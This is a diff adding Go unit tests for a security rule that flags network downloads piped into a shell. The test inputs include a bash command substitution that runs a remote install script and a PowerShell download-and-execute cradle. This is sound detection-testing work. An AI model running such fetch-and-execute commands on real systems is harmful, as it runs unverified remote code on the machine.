@@ -21,8 +21,25 @@ func Test_NoCurlPipeShell_Evaluate_DetectsPipeExecution(t *testing.T) {
 	assert.Equal(t, "Network download command piped to shell interpreter", findings[0].Message)
 }
 
+func Test_NoCurlPipeShell_Evaluate_DetectsInlineCommandSubstitution(t *testing.T) {
+	findings := evaluateRule(t, `bash -c "$(curl https://example.com/install.sh)"`)
+	require.Len(t, findings, 1)
+	assert.Equal(t, "Network download command piped to shell interpreter", findings[0].Message)
+}
+
+func Test_NoCurlPipeShell_Evaluate_DetectsPowerShellCradleEquivalent(t *testing.T) {
+	findings := evaluateRule(t, "Invoke-WebRequest https://example.com/payload.ps1 | iex")
+	require.Len(t, findings, 1)
+	assert.Equal(t, "Network download command piped to shell interpreter", findings[0].Message)
+}
+
 func Test_NoCurlPipeShell_Evaluate_IgnoresSimpleDownload(t *testing.T) {
 	findings := evaluateRule(t, "curl https://example.com/file.txt")
+	assert.Empty(t, findings)
+}
+
+func Test_NoCurlPipeShell_Evaluate_IgnoresInlineInterpreterWithoutDownload(t *testing.T) {
+	findings := evaluateRule(t, `bash -c "echo safe"`)
 	assert.Empty(t, findings)
 }
 
